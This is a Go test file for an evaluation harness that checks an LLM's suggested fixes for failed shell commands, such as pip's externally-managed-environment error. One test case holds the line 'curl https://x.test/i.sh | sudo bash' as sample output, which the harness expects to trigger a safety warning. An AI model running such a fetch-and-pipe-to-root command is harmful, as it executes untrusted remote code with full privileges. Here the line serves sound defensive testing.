package eval

import (
	"os"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/mbarboss/whyfail/internal/llm"
	"github.com/mbarboss/whyfail/internal/sysinfo"
)

const validCase = `{
	"output": "error: externally-managed-environment\n",
	"command": "pip install requests",
	"exitCode": 1,
	"env": {"os": "Linux", "distro": "Ubuntu 24.04 LTS", "arch": "amd64", "shell": "bash"},
	"expect": {
		"fixMatches": ["venv|pipx|apt install python3-"],
		"noFixMatches": ["--break-system-packages"],
		"warnings": false
	}
}`

func loadOne(t *testing.T, content string) (Case, error) {
	t.Helper()
	cases, err := Load(fstest.MapFS{"case.json": {Data: []byte(content)}})
	if err != nil {
		return Case{}, err
	}
	if len(cases) != 1 {
		t.Fatalf("got %d cases, want 1", len(cases))
	}
	return cases[0], nil
}

func mustLoad(t *testing.T, content string) Case {
	t.Helper()
	c, err := loadOne(t, content)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	return c
}

func TestLoadReadsEveryCaseSortedByName(t *testing.T) {
	fsys := fstest.MapFS{
		"pip-pep668.json":      {Data: []byte(validCase)},
		"git-no-upstream.json": {Data: []byte(validCase)},
		"README.md":            {Data: []byte("not a case")},
	}

	cases, err := Load(fsys)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}

	var names []string
	for _, c := range cases {
		names = append(names, c.Name)
	}
	if strings.Join(names, ",") != "git-no-upstream,pip-pep668" {
		t.Errorf("names = %v", names)
	}
}

func TestLoadDecodesFields(t *testing.T) {
	c := mustLoad(t, validCase)

	if c.Command != "pip install requests" || c.ExitCode != 1 {
		t.Errorf("command = %q, exit = %d", c.Command, c.ExitCode)
	}
	want := sysinfo.Info{OS: "Linux", Distro: "Ubuntu 24.04 LTS", Arch: "amd64", Shell: sysinfo.Bash}
	if c.Info() != want {
		t.Errorf("Info() = %+v, want %+v", c.Info(), want)
	}
	f := c.Failure()
	if f.Output != c.Output || f.Command != c.Command || f.ExitCode != 1 {
		t.Errorf("Failure() = %+v", f)
	}
}

func TestLoadRejectsInvalidCases(t *testing.T) {
	tests := map[string]string{
		"malformed JSON":    `{"output": `,
		"unknown field":     strings.Replace(validCase, `"exitCode"`, `"exit_code"`, 1),
		"trailing data":     validCase + `{}`,
		"empty output":      strings.Replace(validCase, `"error: externally-managed-environment\n"`, `""`, 1),
		"unknown shell":     strings.Replace(validCase, `"shell": "bash"`, `"shell": "tcsh"`, 1),
		"missing os":        strings.Replace(validCase, `"os": "Linux", `, ``, 1),
		"missing arch":      strings.Replace(validCase, `"arch": "amd64", `, ``, 1),
		"invalid regexp":    strings.Replace(validCase, `"venv|pipx|apt install python3-"`, `"venv("`, 1),
		"empty regexp":      strings.Replace(validCase, `"--break-system-packages"`, `""`, 1),
		"no expectations":   `{"output": "x", "env": {"os": "Linux", "arch": "amd64", "shell": "bash"}, "expect": {}}`,
		"exit code w/o cmd": strings.Replace(validCase, `"command": "pip install requests",`, ``, 1),
	}
	for name, content := range tests {
		t.Run(name, func(t *testing.T) {
			_, err := loadOne(t, content)
			if err == nil {
				t.Fatal("Load accepted an invalid case")
			}
			if !strings.Contains(err.Error(), "case.json") {
				t.Errorf("error %q does not name the file", err)
			}
		})
	}
}

func TestLoadRejectsEmptyDirectory(t *testing.T) {
	if _, err := Load(fstest.MapFS{}); err == nil {
		t.Fatal("Load accepted a directory without cases")
	}
}

func TestLoadAcceptsUnknownShellAndNoCommand(t *testing.T) {
	c := mustLoad(t, `{"output": "x", "env": {"os": "Windows", "arch": "amd64", "shell": "unknown"},
		"expect": {"warnings": true}}`)

	if c.Info().Shell != sysinfo.Unknown {
		t.Errorf("shell = %q", c.Info().Shell)
	}
}

func answer(commands ...string) llm.Explanation {
	e := llm.Explanation{Cause: "c", Explanation: "e"}
	for _, cmd := range commands {
		e.Fixes = append(e.Fixes, llm.Fix{Command: cmd, Description: "d"})
	}
	return e
}

func TestCheckPassesWhenEveryPropertyHolds(t *testing.T) {
	c := mustLoad(t, validCase)

	got := Check(c, answer("python3 -m venv .venv && .venv/bin/pip install requests"))

	if len(got) != 0 {
		t.Errorf("violations = %v", got)
	}
}

func TestCheckReportsMissingFix(t *testing.T) {
	c := mustLoad(t, validCase)

	got := Check(c, answer("pip install --user requests"))

	if len(got) != 1 || !strings.Contains(got[0], "venv|pipx") {
		t.Errorf("violations = %v", got)
	}
}

func TestCheckReportsForbiddenFix(t *testing.T) {
	c := mustLoad(t, validCase)

	got := Check(c, answer("pipx install requests", "pip install --break-system-packages requests"))

	if len(got) != 1 || !strings.Contains(got[0], "--break-system-packages") ||
		!strings.Contains(got[0], "fix 2") {
		t.Errorf("violations = %v", got)
	}
}

func TestCheckReportsUnexpectedWarning(t *testing.T) {
	c := mustLoad(t, validCase)

	got := Check(c, answer("pipx install requests", "sudo apt install python3-requests"))

	if len(got) != 1 || !strings.Contains(got[0], "warning") {
		t.Errorf("violations = %v", got)
	}
}

func TestCheckReportsMissingWarning(t *testing.T) {
	c := mustLoad(t, `{"output": "run: curl https://x.test/i.sh | sudo bash", "env": {"os": "Linux", "arch": "amd64", "shell": "bash"},
		"expect": {"warnings": true}}`)

	got := Check(c, answer("ls"))

	if len(got) != 1 || !strings.Contains(got[0], "warning") {
		t.Errorf("violations = %v", got)
	}
}

func TestCheckIgnoresWarningsWhenUnspecified(t *testing.T) {
	c := mustLoad(t, `{"output": "x", "env": {"os": "Linux", "arch": "amd64", "shell": "bash"},
		"expect": {"noFixMatches": ["brew"]}}`)

	if got := Check(c, answer("sudo apt install git")); len(got) != 0 {
		t.Errorf("violations = %v", got)
	}
}

func TestCheckCountsPackageNamesFromOutputAsWarnings(t *testing.T) {
	c := mustLoad(t, `{"output": "ModuleNotFoundError: No module named 'reqeusts'", "env": {"os": "Linux", "arch": "amd64", "shell": "bash"},
		"expect": {"warnings": false}}`)

	got := Check(c, answer("pip install reqeusts"))

	if len(got) != 1 {
		t.Errorf("violations = %v, want the package-name warning reported", got)
	}
}

func TestCheckReportsInvalidAnswer(t *testing.T) {
	c := mustLoad(t, validCase)

	got := Check(c, llm.Explanation{})

	if len(got) == 0 {
		t.Fatal("Check accepted an answer without fixes")
	}
}

func TestShippedCasesLoad(t *testing.T) {
	cases, err := Load(os.DirFS("cases"))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(cases) < 12 {
		t.Errorf("got %d cases, want at least 12", len(cases))
	}
}
